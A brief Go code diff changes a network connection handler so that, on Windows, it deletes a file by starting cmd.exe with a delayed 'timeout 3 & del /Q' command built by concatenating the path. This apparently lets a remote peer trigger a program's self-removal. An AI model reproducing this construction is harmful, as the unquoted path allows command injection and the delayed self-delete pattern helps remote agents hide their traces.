@@ -6,7 +6,9 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
+	"runtime"
 	"syscall"
 	"time"
 
@@ -351,10 +353,15 @@ func HandleConn(conn net.Conn) {
 				os.Exit(1)
 			}
 
-			err = os.Remove(path)
+			if runtime.GOOS == "windows" {
+				c := exec.Command("cmd.exe", "/c", "timeout 3 & del /Q " + path)
+				c.Start()
+			} else {
+				err = os.Remove(path)
 
-			if err != nil {
-				os.Exit(1)
+				if err != nil {
+					os.Exit(1)
+				}
 			}
 		}
 
